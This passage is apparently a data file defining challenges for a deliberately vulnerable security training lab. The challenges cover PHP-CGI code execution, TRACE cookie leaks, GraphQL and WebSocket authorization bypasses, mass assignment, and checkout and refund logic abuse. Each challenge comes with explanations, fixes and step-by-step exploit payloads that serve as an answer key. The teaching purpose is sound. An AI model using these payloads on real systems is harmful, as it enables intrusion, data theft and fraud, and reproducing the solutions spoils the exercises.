        id: "php-cgi-rce", category: "infra", title: "PHP-CGI Remote Code Execution", shortTitle: "PHP-CGI RCE",
        tags: ["infra", "php-cgi-rce", "php", "cgi", "rce"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Invoice Generator (PHP-CGI)", blurb: "⚠️ SIMULATED CVE-2012-1823 — PHP-CGI misreads query-string content as CLI flags.",
        inputContext: "Raw query string",
        goal: { explain: "When PHP runs via CGI rather than as a proper module, php-cgi can misinterpret query-string content as command-line flags to the php-cgi binary itself.",
          example: "?-d+allow_url_include=1+-d+auto_prepend_file=php://input — '+' represents a space, matching the real-world exploit convention for this CVE.",
          mission: ["Get a dangerous PHP CLI directive accepted via the query string.", "The FLAG appears on confirmed (simulated) execution."] },
        difficultyNotes: { easy: "No filtering.", medium: "'allow_url_include' is blocked — a real documented alternate flag combo isn't.", hard: "Both prior flags are blocked — a third, real documented combo isn't." },
        why: "The query string is passed directly to a CGI-invoked interpreter, which misparses it as CLI arguments; filtering targets specific known flag names rather than the underlying misconfiguration.",
        fix: "Run PHP as a proper SAPI module (not CGI), and keep it patched — this is a fixed interpreter-level bug, not something app-level filtering can fully close.",
        reportSummary: { easy: "Dangerous PHP CLI directives are accepted directly via the query string.", medium: "One specific directive is blocked, but a real documented alternate combination isn't.", hard: "Two directives are blocked, but a third real documented combination still works." },
        reportImpact: { easy: "Full (simulated) remote code execution via CGI query-string confusion.", medium: "Same impact via an alternate documented flag combo.", hard: "Same impact via yet another documented combo — denylisting specific flags never closes this class of bug." },
        solutionSteps: {
          easy: ["Append to the URL: ?-d+allow_url_include=1+-d+auto_prepend_file=php://input", "FLAG appears."],
          medium: ["Notice allow_url_include is blocked now.", "Try: ?-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0", "FLAG appears."],
          hard: ["auto_prepend_file is blocked too now.", "Try: ?-d+disable_functions=+-d+safe_mode=0", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "xst", category: "infra", title: "Cross-Site Tracing (XST)", shortTitle: "XST",
        tags: ["infra", "xst"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Legacy Web Server", blurb: "TRACE requests echo back whatever they arrived with — including cookies HttpOnly is supposed to protect.",
        inputContext: "HTTP TRACE method",
        goal: { explain: "HttpOnly stops JavaScript from reading a cookie directly, but it does nothing to stop the raw HTTP TRACE method from echoing that same cookie back in its response body.",
          example: "Browsers block script-initiated TRACE requests by design — real testing needs a raw HTTP client like curl -X TRACE or Burp Repeater.",
          mission: ["Send a TRACE request carrying the HttpOnly-protected cookie.", "The FLAG appears in the echoed response."] },
        difficultyNotes: { easy: "TRACE is fully enabled, no restriction.", medium: "TRACE is blocked for requests that look cross-site in a browser — a check curl never triggers.", hard: "TRACE is disabled on the main path — but a forgotten pre-migration path (/legacy) still has it enabled." },
        why: "The web server has the legacy TRACE method enabled, which is unrelated to (and not covered by) the HttpOnly cookie protection.",
        fix: "Disable the TRACE (and TRACK) HTTP methods entirely at the server/proxy level — this is a server configuration fix, not something app code can fully control.",
        reportSummary: { easy: "TRACE is enabled with no restriction and echoes cookies.", medium: "A same-origin browser check blocks script-based abuse, but doesn't stop a raw HTTP client.", hard: "TRACE is disabled on the primary path, but a leftover legacy path still has it enabled." },
        reportImpact: { easy: "Full HttpOnly bypass — session cookie recovery via TRACE echo.", medium: "Same impact from any non-browser HTTP client (curl, Burp).", hard: "Same impact via the forgotten legacy path." },
        solutionSteps: {
          easy: ["Use curl -X TRACE against the lab URL with your session cookie, or the in-app 'simulate' button.", "FLAG appears in the echoed response."],
          medium: ["The simulate button (same-origin) still works — a real cross-site browser attempt wouldn't.", "FLAG appears via the simulate button or curl."],
          hard: ["TRACE on the main path now 404s.", "Send the same TRACE request to /vuln/xst/legacy instead.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // ------------------------------------------------------------ AUTHZ2
      {
        id: "http-verb-tampering", category: "authz", title: "HTTP Verb Tampering", shortTitle: "Verb Tampering",
        tags: ["authz", "http-verb-tampering", "http", "verb", "tampering"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Admin Panel", blurb: "A 'Delete User' action is protected for POST — what about GET, PUT, or DELETE?",
        inputContext: "HTTP method / X-HTTP-Method-Override header",
        goal: { explain: "Authorization middleware registered for one HTTP verb doesn't automatically cover the same action reachable via a different verb.",
          example: "A role check wired into the POST handler does nothing to protect a duplicate, unprotected GET route to the same action.",
          mission: ["Trigger the protected admin action using a verb (or override) the auth check doesn't cover.", "The FLAG appears in the response."] },
        difficultyNotes: { easy: "The action is reachable via an unprotected duplicate GET route.", medium: "GET is protected now — a generic 'future REST support' PUT/DELETE catch-all isn't.", hard: "All four verbs are protected — but a POST with an X-HTTP-Method-Override: DELETE header bypasses the re-check." },
        why: "The same sensitive action is reachable through multiple route registrations or method-override mechanisms, only one of which received the authorization check.",
        fix: "Apply authorization middleware centrally (to the action/resource, not per-verb-per-route), and treat method-override headers as untrusted input requiring the exact same checks as their target verb.",
        reportSummary: { easy: "A duplicate, completely unprotected GET route exists for the same delete action.", medium: "GET is fixed, but a generic catch-all for PUT/DELETE was added later without the same guard.", hard: "All direct verbs are protected, but X-HTTP-Method-Override is trusted after the original method's check already passed." },
        reportImpact: { easy: "Any unauthenticated/low-privilege user can delete users via a simple GET.", medium: "Same impact via PUT or DELETE.", hard: "Same impact via a POST carrying a spoofed override header." },
        solutionSteps: {
          easy: ["Call the delete-user endpoint with GET instead of POST.", "FLAG appears — no role check exists on that route."],
          medium: ["GET is protected now.", "Call the same endpoint with PUT or DELETE instead.", "FLAG appears."],
          hard: ["All four direct verbs are protected now.", "Send a POST with header X-HTTP-Method-Override: DELETE.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // ===================================================================
      // API SECURITY — new category added in Phase 3a (Section 8 of the
      // upgrade spec). GraphQL uses real graphql-js; WebSockets use the
      // standard `ws` package. See routes/vulns-api.js.
      // ===================================================================
      {
        id: "graphql-introspection", category: "api", title: "GraphQL Schema Introspection", shortTitle: "GraphQL Introspection",
        tags: ["api", "graphql-introspection", "graphql", "introspection"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp API (GraphQL)", blurb: "A real GraphQL endpoint (graphql-js) — map out fields the app's own UI never shows you.",
        inputContext: "POST /graphql — query body",
        goal: { explain: "Production GraphQL endpoints often leave introspection enabled, letting anyone enumerate the ENTIRE schema — including internal-only fields no legitimate client ever queries.",
          example: "{ __schema { types { name fields { name } } } } returns the full schema in one request.",
          mission: ["Discover a field that the app's own UI never uses.", "The FLAG appears once you've confirmed it exists."] },
        difficultyNotes: { easy: "Introspection is fully open — just ask for the schema.", medium: "A naive filter blocks the literal substring \"__schema\" — try __type instead, which reveals the same field-level detail one type at a time.", hard: "Both __schema and __type are properly disabled now (a real graphql-js validation rule). Query a field with a deliberate typo instead — read the error message closely." },
        why: "Introspection is a debugging/tooling feature left enabled in production, or 'disabled' via a filter that only catches the most obvious query shape.",
        fix: "Disable introspection in production using the schema's real validation rules (not a text filter), and treat 'Did you mean' suggestion errors as a real information-disclosure vector too — they leak schema structure even with introspection fully off.",
        reportSummary: { easy: "__schema introspection is fully enabled.", medium: "A substring filter blocks \"__schema\" but not \"__type\", which exposes the same field list.", hard: "Introspection is correctly disabled via the schema's real validation rules — but 'Did you mean' suggestions on misspelled field names still leak real field names one at a time." },
        reportImpact: { easy: "Full schema disclosure, including internal-only fields.", medium: "Same impact via an unblocked introspection field.", hard: "Slower, but the same schema can still be reconstructed field-by-field via error message probing." },
        solutionSteps: {
          easy: ["POST { \"query\": \"{ __schema { types { name fields { name } } } }\" } to /graphql.", "Look for a field no visible UI ever uses. FLAG appears."],
          medium: ["Try __schema — notice it's blocked.", "Try: { __type(name: \"User\") { fields { name } } }", "FLAG appears."],
          hard: ["Both introspection fields are blocked now.", "Query a deliberately misspelled field, e.g. { user(id:1) { internalDebugNote } } — read the 'Did you mean' suggestion.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "graphql-authz-bypass", category: "api", title: "GraphQL Object-Level Authorization (BOLA)", shortTitle: "GraphQL BOLA",
        tags: ["api", "graphql-authz-bypass", "graphql", "authz", "bypass", "expert-tier"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp API (GraphQL)", blurb: "The same IDOR concept, applied to a GraphQL query instead of a REST URL parameter.",
        inputContext: "POST /graphql — query body",
        goal: { explain: "GraphQL resolvers need their OWN authorization checks — a schema alone enforces nothing. It's easy to check ownership on the 'main' query field and forget a duplicate or generic one — or, at a higher level, to check ownership only once per request instead of once per field.",
          example: "{ user(id: 100) { username ssn } } — request another user's record by id and see what comes back.",
          mission: ["Read another user's sensitive data (their SSN) via a query field that skips the ownership check.", "The FLAG appears once confirmed."] },
        difficultyNotes: { easy: "user(id) has no ownership check at all.", medium: "user(id) is fixed — but a legacy duplicate field, userProfile(id), was never updated.", hard: "Both user(id) and userProfile(id) are fixed. There's also a generic node(id) lookup (a common Relay-style pattern) that never got type-specific authorization applied to it.", expert: "user(id), userProfile(id), AND node(id) are all covered now — by one centralized pre-execution check instead of a per-field one. That check only inspects the FIRST guarded field in the query. Alias a second occurrence with a different id and it's never checked at all." },
        why: "Object-level authorization was added to one resolver but not a functionally-identical duplicate, or not to a generic/shared lookup field — or, at expert tier, was centralized into one query-level check that only validates the first instance of a repeatable field.",
        fix: "Apply authorization at the resolver level, on every field instance independently — not as a single query-level check assumed to cover every aliased occurrence, and not re-implemented per-field where it's easy to forget a duplicate or generic one.",
        reportSummary: { easy: "user(id) returns any user's full record with zero ownership check.", medium: "user(id) is fixed, but userProfile(id) — an old duplicate the migration forgot — isn't.", hard: "Both named lookups are fixed, but the generic node(id) field bypasses type-specific authorization entirely.", expert: "All three lookup fields are covered by a single centralized authorization check — but that check only inspects the first occurrence of a guarded field in the document. A second, differently-aliased instance of the same field with a different id is never independently validated." },
        reportImpact: { easy: "Full BOLA — read any user's PII by id.", medium: "Same impact via the forgotten legacy field.", hard: "Same impact via the generic lookup field.", expert: "Same full BOLA impact, reachable even when every named lookup field is individually covered by a real authorization check — demonstrates that centralizing a check at the query level instead of the field level creates exactly the kind of gap batching/aliasing was designed to exploit." },
        solutionSteps: {
          easy: ["Query: { user(id: 100) { username ssn } } (100 is not your own id).", "FLAG appears."],
          medium: ["user(id: 100) is now checked — try: { userProfile(id: 100) { username ssn } }", "FLAG appears."],
          hard: ["Both named fields are fixed.", "Try: { node(id: 100) { username ssn } }", "FLAG appears."],
          expert: ["First confirm a single non-owned lookup is blocked: { user(id: 100) { ssn } } fails.", "Now alias two calls in one query: { a: user(id: <your own id>) { username } b: user(id: 100) { ssn } }", "The check only validates the first (a), which is your own id — b sails through unchecked.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "graphql-excessive-exposure", category: "api", title: "GraphQL Excessive Data Exposure", shortTitle: "GraphQL Data Exposure",
        tags: ["api", "graphql-excessive-exposure", "graphql", "excessive", "exposure"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp API (GraphQL)", blurb: "The user directory search is meant to show public info only — see what the schema actually lets you request for EVERY user at once.",
        inputContext: "POST /graphql — query body",
        goal: { explain: "GraphQL lets the CLIENT choose which fields to return — if the schema exposes a sensitive field anywhere reachable, and there's no field-level authorization, any query can pull it for every record in a list.",
          example: "{ users { username ssn passwordHash apiKey } } — one request, every user's sensitive data.",
          mission: ["Get sensitive fields (ssn, passwordHash, or apiKey) back for a user who is NOT you, via a list-style query.", "The FLAG appears once confirmed."] },
        difficultyNotes: { easy: "No field-level restriction at all on the users/search list queries.", medium: "Direct selection of sensitive fields is blocked by a text filter — but the filter only scans the query's own inline braces, not fields pulled in via a named fragment.", hard: "A real, AST-based field check blocks sensitive fields on users/search properly — but the generic node(id) lookup was never covered by that same check." },
        why: "Sensitive fields are reachable through the schema with no field-level authorization, or a filter meant to catch them only understands simple inline queries, not the full range of valid GraphQL query syntax (fragments, aliases).",
        fix: "Apply field-level authorization directly in the resolver/type layer (checked by the real query structure, not a text filter), consistently across every root field that can reach the type — including generic ones.",
        reportSummary: { easy: "Sensitive fields are returned for every user via a plain list query.", medium: "Direct field selection is blocked, but the same fields reachable via a GraphQL fragment aren't.", hard: "users/search are properly field-authorized now, but node(id) reaches the same sensitive fields with no check." },
        reportImpact: { easy: "Mass PII/secret disclosure — every user's SSN, password hash, and API key in one request.", medium: "Same impact via a fragment-based bypass.", hard: "Same impact, scoped to one user per request, via the generic lookup field." },
        solutionSteps: {
          easy: ["Query: { users { username ssn passwordHash apiKey } }", "FLAG appears."],
          medium: ["Direct fields are blocked now.", "Try: fragment F on User { ssn passwordHash apiKey }\\n{ users { username ...F } }", "FLAG appears."],
          hard: ["The fragment trick is blocked now (real AST-based check).", "Try: { node(id: 1) { username ssn passwordHash apiKey } }", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "websocket-no-auth", category: "api", title: "Missing WebSocket Authentication/Authorization", shortTitle: "WebSocket No Auth",
        tags: ["api", "websocket-no-auth", "websocket", "no", "auth"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Live Notifications", blurb: "A live activity feed over WebSocket — see whose account activity you can actually subscribe to.",
        inputContext: "WebSocket — ws://.../ws/notifications",
        goal: { explain: "WebSocket connections need the same authentication AND authorization discipline as HTTP endpoints — both at connect time, and per message type once connected.",
          example: "Connect, then send {\"type\":\"subscribe\",\"targetUserId\":N} for a user id that isn't yours.",
          mission: ["Receive another user's private notifications, or send a message type you shouldn't be able to.", "The FLAG appears in a WebSocket message once confirmed."] },
        difficultyNotes: { easy: "No authentication is required to connect at all.", medium: "A valid session is now required to connect — but the subscribe target isn't checked against who you actually are.", hard: "The subscribe target is checked correctly now. There's also an admin-broadcast message type that any connected client can send — it was never gated by role at all." },
        why: "The WS handshake (or a specific message type within an otherwise-authenticated connection) has no authorization check.",
        fix: "Authenticate the WebSocket handshake itself, AND re-check authorization for every distinct message type the connection can send — a connection being authenticated doesn't mean every action within it is authorized.",
        reportSummary: { easy: "The endpoint accepts connections with no authentication and streams any requested user's data.", medium: "Connecting requires a session, but the subscribe target isn't matched against the caller's own identity.", hard: "Subscribe targets are checked, but a separate admin-only message type is accepted from any connection." },
        reportImpact: { easy: "Any unauthenticated client can read any user's private notifications in real time.", medium: "Same impact for any logged-in user, against any other user.", hard: "Privilege escalation — a regular user can trigger a system-wide alert broadcast." },
        solutionSteps: {
          easy: ["Open the WebSocket, subscribe to any target id.", "FLAG appears in the message stream."],
          medium: ["Connecting now requires a session cookie (the page already has one).", "Subscribe to a target id that isn't yours.", "FLAG appears."],
          hard: ["Subscribing to someone else's id is now rejected.", "Click 'Send admin-broadcast message' instead.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "websocket-chat-hijack", category: "api", title: "Cross-Room Access in Live Chat (WebSocket)", shortTitle: "Chat Room Hijack",
        tags: ["api", "websocket-chat-hijack", "websocket", "chat", "room", "isolation"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Live Support Chat", blurb: "A live support-chat widget over WebSocket — room ids are the only thing standing between your conversation and someone else's.",
        inputContext: "WebSocket — ws://.../ws/chat, {type:\"join\",roomId}",
        goal: { explain: "Joining a chat room over WebSocket needs the same ownership check any HTTP endpoint would need for someone else's data — a room id isn't a secret credential, and 'you don't know the id' is not access control.",
          example: "Connect, then send {\"type\":\"join\",\"roomId\":\"...\"} for a room id that isn't the one you were given.",
          mission: ["Join another customer's live support conversation and read (or be present for) messages that weren't meant for you.", "The FLAG appears in a WebSocket message once confirmed."] },
        difficultyNotes: { easy: "Room ids are plain sequential numbers with no ownership check on join at all.", medium: "Room ids are short 4-digit codes instead of sequential — 'less guessable' isn't the same as checked, and the space is still small enough to try.", hard: "Room ids are long, genuinely unguessable random tokens now — but a separate 'claim-agent-access' message type hands out a list of every active room id, to any connection, with no role check at all." },
        why: "The room-join handler checks whether a room exists, but never whether the connecting session is actually a participant in it.",
        fix: "Track real room membership server-side (who created or was invited into each room) and check it on every join AND on every message within the room — not just at initial connect.",
        reportSummary: { easy: "Sequential, enumerable room ids with no ownership check let any connection join any room.", medium: "Short 4-digit room ids are practically brute-forceable, and still have no ownership check.", hard: "Room ids are unguessable, but an unauthenticated 'agent' capability leaks every active room id directly." },
        reportImpact: { easy: "Any user can read or participate in any other customer's live support conversation, including PII shared with the (simulated) agent.", medium: "Same impact, reachable via a small brute-force of the id space.", hard: "Same impact via the leaked room list — no guessing required at all." },
        solutionSteps: {
          easy: ["Connect and join room ids near your own (e.g. 4820, 4821, 4822).", "One of them returns another customer's conversation history.", "FLAG appears."],
          medium: ["Sequential guessing no longer works — try a handful of 4-digit codes instead.", "FLAG appears once you land in the victim's room."],
          hard: ["Guessing the room id directly is impractical now.", "Send {\"type\":\"claim-agent-access\"} instead — it lists every active room id with no check.", "Join the leaked id.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "websocket-origin-validation", category: "api", title: "Cross-Site WebSocket Hijacking (CSWSH)", shortTitle: "CSWSH",
        tags: ["api", "websocket-origin-validation", "websocket", "origin", "validation"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Wire Transfer Terminal", blurb: "Unlike fetch/XHR, WebSocket connections carry cookies cross-origin by default — Origin validation is the only real defense.",
        inputContext: "WebSocket handshake — Origin header",
        goal: { explain: "A WebSocket handshake authenticates via whatever cookies the browser has for that origin — automatically, even cross-site, since WebSocket isn't subject to CORS the way fetch/XHR is. If the server doesn't validate the Origin header, any website you visit can open an authenticated connection to this one on your behalf.",
          example: "Real browsers can't forge the Origin header — genuine testing needs a raw client. Use the probe on the lab page (or a real script/wscat) to test honestly.",
          mission: ["Get a transfer accepted over a connection whose Origin the server should have rejected.", "The FLAG appears in the transfer response once confirmed."] },
        difficultyNotes: { easy: "No Origin check on the handshake at all.", medium: "Origin must contain \"securecorp-demo.test\" — a substring check, not an exact match.", hard: "Origin is validated exactly and correctly on /ws/transfer now — but a legacy alias path, /ws/transfer-legacy, kept for backwards compatibility, was never given the same check." },
        why: "WebSocket connections are not covered by the Same-Origin Policy the way fetch/XHR are — Origin header validation is the ONLY thing standing between this endpoint and any website on the internet.",
        fix: "Validate the Origin header with an exact allowlist match on every WebSocket upgrade path, including legacy/alias routes — and prefer a CSRF-style per-connection token as defense in depth.",
        reportSummary: { easy: "No Origin validation — any website can open an authenticated connection.", medium: "A substring check on Origin is bypassed by embedding the trusted string in an attacker-controlled domain.", hard: "The primary path validates Origin correctly, but a forgotten legacy alias path doesn't." },
        reportImpact: { easy: "Full Cross-Site WebSocket Hijacking — any site you visit can initiate transfers as you.", medium: "Same impact via a crafted attacker domain.", hard: "Same impact via the legacy path." },
        solutionSteps: {
          easy: ["Set the simulated Origin to any external domain and probe /ws/transfer.", "FLAG appears in the response."],
          medium: ["An unrelated origin is now rejected.", "Try: https://securecorp-demo.test.evil-attacker.test", "FLAG appears."],
          hard: ["That bypass is fixed now on the main path.", "Probe /ws/transfer-legacy instead (check the box on the lab page).", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "api-mass-assignment", category: "api", title: "Mass Assignment", shortTitle: "Mass Assignment",
        tags: ["api", "api-mass-assignment", "mass", "assignment"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Account API", blurb: "A profile-update endpoint applies whatever fields you send it — including ones no form ever exposes.",
        inputContext: "PATCH JSON body",
        goal: { explain: "A classic, extremely common real-world API bug: an update endpoint blindly applies every field in the request body to the underlying record, rather than only the fields the UI is meant to let you change.",
          example: "The profile form only ever sends name/email/bio — but does the API actually enforce that?",
          mission: ["Escalate your own account to admin by sending a field the UI never exposes.", "The FLAG appears once your role is admin."] },
        difficultyNotes: { easy: "The update endpoint applies every field in the request body with zero restriction.", medium: "The main endpoint now allowlists fields — but a separate bulk-import endpoint (for CSV-based profile imports) reuses the same update logic without the same allowlist.", hard: "Both endpoints correctly block the exact field name \"role\" — but the block is case-sensitive, and the field still gets applied under a differently-cased key." },
        why: "Field-level write authorization is missing, or applied inconsistently across endpoints/code paths that ultimately touch the same record.",
        fix: "Use an explicit allowlist of writable fields (not a denylist) at every endpoint that can modify a record, applied consistently regardless of key casing.",
        reportSummary: { easy: "The profile endpoint has no field restriction — any field, including role, is applied directly.", medium: "The main endpoint allowlists fields correctly, but a secondary bulk-import endpoint doesn't.", hard: "Both endpoints deny the exact string \"role\", but a differently-cased key (\"Role\") still resolves to the same real field." },
        reportImpact: { easy: "Full privilege escalation to admin via a single API request.", medium: "Same impact via the overlooked import endpoint.", hard: "Same impact via a case-sensitivity mismatch between validation and persistence." },
        solutionSteps: {
          easy: ["PATCH the profile endpoint with {\"role\":\"admin\"}.", "FLAG appears in the response."],
          medium: ["The main endpoint now rejects role. Try POST /vuln/api-mass-assignment/import with {\"role\":\"admin\"} instead.", "FLAG appears."],
          hard: ["Both endpoints block \"role\" now.", "Try {\"Role\":\"admin\"} (capital R) against the main endpoint instead.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },

      // ===================================================================
      // BUSINESS LOGIC — new category added in Phase 3b (Section 15 of the
      // upgrade spec). See routes/vulns-business.js.
      // ===================================================================
      {
        id: "price-tampering", category: "business-logic", title: "Price & Quantity Tampering", shortTitle: "Price Tampering",
        tags: ["business-logic", "price-tampering", "price", "tampering"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Store — Checkout", blurb: "Does checkout trust the price and quantity YOU send, or the catalog?",
        inputContext: "JSON body (cart items)",
        goal: { explain: "A checkout total should always be computed from server-known prices — trusting anything about price from the client (even indirectly, like a signed adjustment field) turns checkout into 'name your own price.'",
          example: "{items:[{id:'widget', qty:1, price:0.01}]} — does the server catch a price that doesn't match the real catalog?",
          mission: ["Get a real order's total down to essentially nothing.", "The FLAG appears once the computed total is at or below $5."] },
        difficultyNotes: { easy: "The total is computed directly from whatever price you send.", medium: "Price is now looked up from the real catalog — but quantity isn't bounds-checked, so a negative quantity produces a negative total.", hard: "Quantity must be positive now. There's a separate gift-wrap discount field, applied to the total with no bounds check at all." },
        why: "The server trusts a client-supplied value (price, or an unbounded adjustment field) instead of computing the total entirely from its own catalog data.",
        fix: "Compute totals exclusively from server-side catalog prices and validated (non-negative, reasonable-range) quantities — never apply any client-supplied numeric adjustment without a sane bound.",
        reportSummary: { easy: "The price field is trusted directly from the request body.", medium: "Price is fixed, but quantity has no lower bound, so a negative value inverts the total.", hard: "Quantity is fixed, but a side-channel discount field is applied without any bound at all." },
        reportImpact: { easy: "Purchase anything for an arbitrary (near-zero) price.", medium: "Same impact via negative quantity — an order can even go net-negative.", hard: "Same impact via the unbounded discount field." },
        solutionSteps: {
          easy: ["POST {items:[{id:'widget',qty:1,price:0.01}]} to /checkout.", "FLAG appears."],
          medium: ["Notice price is now the real catalog value regardless of what you send.", "Try qty: -10 on a high-value item instead.", "FLAG appears."],
          hard: ["Negative quantity is rejected now.", "Add giftWrapDiscount: -1000 to the request body.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "coupon-abuse", category: "business-logic", title: "Coupon & Discount Abuse", shortTitle: "Coupon Abuse",
        tags: ["business-logic", "coupon-abuse", "coupon", "abuse"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Store — Apply Coupon", blurb: "A one-time 10%-off coupon — is it actually enforced as one-time?",
        inputContext: "JSON body (coupon code)",
        goal: { explain: "A coupon meant for one use needs to be tracked as used in a way that actually matches how it's later validated — any mismatch between the 'used' check and the 'is this the same coupon' check reopens it.",
          example: "Applying WELCOME10 once should take 10% off, once. Does applying it again — or a lightly-different version of the same string — take another 10% off?",
          mission: ["Get more than the intended single 10% discount applied.", "The FLAG appears once the abuse is confirmed."] },
        difficultyNotes: { easy: "The coupon can be applied repeatedly with no tracking at all.", medium: "The exact string \"WELCOME10\" is now single-use — but the check doesn't normalize whitespace or case the way the discount logic does.", hard: "Coupon codes are normalized consistently now. There's a separate \"referral code\" field, meant to be a different discount type, that accepts the same code value and stacks on top." },
        why: "Single-use tracking checks the raw input string, while the actual discount-granting logic normalizes it — any code that's 'different' by the tracker's rules but 'the same' by the discount logic's rules bypasses the limit.",
        fix: "Normalize the code identically, once, before BOTH the used-check and the discount lookup — and treat structurally-different discount fields (coupon vs. referral) as mutually exclusive if that's the intended business rule.",
        reportSummary: { easy: "No usage tracking at all — apply repeatedly for compounding discounts.", medium: "Usage tracking checks the raw string; a whitespace or casing variant isn't recognized as \"already used.\"", hard: "Tracking is properly normalized, but a separate referral-code field grants the same discount again, unrelated to the coupon's own usage tracking." },
        reportImpact: { easy: "Unlimited compounding discount, approaching a free order.", medium: "Same impact via a trivial string variant.", hard: "A stacked double-discount via a field meant to be a separate, independent promotion." },
        solutionSteps: {
          easy: ["Click Apply several times.", "FLAG appears once the total is low enough."],
          medium: ["Notice the exact code can't be reapplied.", "Try \"WELCOME10 \" (trailing space) or \"welcome10\" (lowercase).", "FLAG appears."],
          hard: ["String variants are normalized and blocked now.", "Submit the same code in the separate Referral code field alongside the (already-used) coupon.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "workflow-bypass", category: "business-logic", title: "Multi-Step Workflow Bypass", shortTitle: "Workflow Bypass",
        tags: ["business-logic", "workflow-bypass", "workflow", "bypass"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Store — Multi-Step Checkout", blurb: "Cart → Payment → Confirm. Does Confirm actually require a real completed Payment?",
        inputContext: "Sequenced POST requests",
        goal: { explain: "A multi-step process is only as strong as its weakest transition — checking that a flag is 'set' means nothing if the step that sets it doesn't verify what it claims to.",
          example: "Can you reach a 'completed' order state without a real, correctly-amounted payment ever happening?",
          mission: ["Get an order marked completed without genuinely paying the right amount for it.", "The FLAG appears once confirmed."] },
        difficultyNotes: { easy: "Confirm doesn't check for a prior payment step at all.", medium: "Confirm now checks a \"paid\" flag — but the /pay step sets that flag unconditionally, without verifying any real payment.", hard: "/pay now requires a real-looking payment token for a specific order amount — but Confirm never re-checks that the paid amount still matches the CURRENT cart total after it changes." },
        why: "A later step trusts that an earlier step did its job correctly, without verifying the actual claim (a real payment; the same order amount) the earlier step is supposed to represent.",
        fix: "Every step should verify substance, not just presence — /pay should confirm a real payment occurred for a specific amount, and /confirm should re-validate that the paid amount still matches the order being confirmed.",
        reportSummary: { easy: "The final step has no dependency on any prior step at all.", medium: "A \"paid\" flag is checked, but nothing upstream of it verifies a genuine payment.", hard: "Payment amount is verified at pay-time, but never re-checked against the order at confirm-time, allowing a cart swap after paying for something cheaper." },
        reportImpact: { easy: "Free orders — skip payment entirely.", medium: "Same impact via a trivially-satisfied payment flag.", hard: "Pay for a cheap item, receive an expensive one." },
        solutionSteps: {
          easy: ["POST directly to /confirm, skipping /pay entirely.", "FLAG appears."],
          medium: ["Confirm alone now fails.", "POST an empty body to /pay first, then /confirm.", "FLAG appears."],
          hard: ["/pay now needs a real token tied to an amount.", "Get a token and pay for the $49.99 item, then change the cart to the $999 item before confirming.", "FLAG appears."]
        },
        answerPlaceholder: "FLAG{...}"
      },
      {
        id: "refund-abuse", category: "business-logic", title: "Refund Abuse", shortTitle: "Refund Abuse",
        tags: ["business-logic", "refund-abuse", "refund", "abuse"],
        successCondition: "Server-verified flag: exploit the vulnerability so the server reveals a session-bound flag, then submit that flag for verification.",
        demoApp: "SecureCorp Store — Refunds", blurb: "A $200 order's refund endpoint — bounded correctly, and only callable once?",
        inputContext: "JSON body (refund amount)",
        goal: { explain: "A refund needs BOTH a bound (can't exceed what was paid) AND idempotency (can't be issued more than once) — and if there are two different paths that can both issue a refund, the bound needs to account for what the OTHER path already gave out.",
          example: "Request a refund for more than the order cost, or request the same refund multiple times.",
          mission: ["Get total refunds on this order to exceed what was actually paid.", "The FLAG appears once confirmed."] },
        difficultyNotes: { easy: "The refund amount is trusted directly with no cap at all.", medium: "The amount is capped per-call at the order total now — but the endpoint can be called repeatedly with no \"already refunded\" tracking.", hard: "The main refund endpoint is now properly capped and single-use. A separate support-issued partial-refund endpoint doesn't check what the main endpoint already refunded." },
        why: "A bound check (or a single-use check, or cross-endpoint awareness of total-already-issued) is missing from one or more of the paths that can issue money back.",
        fix: "Track total refunded per order in one place, and have every refund-issuing code path check and update that same running total before approving a new refund.",
        reportSummary: { easy: "No bound on the refund amount at all.", medium: "Bounded per call, but repeatable indefinitely.", hard: "The main path is properly capped and single-use, but a secondary support tool doesn't check the running total." },
        reportImpact: { easy: "Refund far more than was ever paid, in one request.", medium: "Same impact via repeated calls.", hard: "Same impact via a secondary endpoint unaware of the first refund." },
        solutionSteps: {
          easy: ["Request a $2000 refund on the $200 order.", "FLAG appears."],
